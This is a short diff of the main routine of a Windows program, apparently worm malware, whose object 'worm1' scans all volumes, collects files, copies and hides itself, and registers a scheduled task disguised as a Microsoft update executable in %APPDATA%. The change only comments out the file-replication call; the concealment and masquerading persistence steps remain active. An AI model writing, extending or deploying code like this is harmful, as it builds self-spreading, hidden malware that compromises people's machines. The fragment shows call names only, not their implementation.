@@ -38,7 +38,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	worm1.scan_all_volumes();
 	worm1.print_list_dir();
 	worm1.collect_visible_files();
-	worm1.replicate_files(5);
+	//worm1.replicate_files(5);
 	worm1.copy_and_hide_worm();
 	worm1.create_scheduled_task(L"%APPDATA%\\Microsoft\\Update\\update.exe");
 
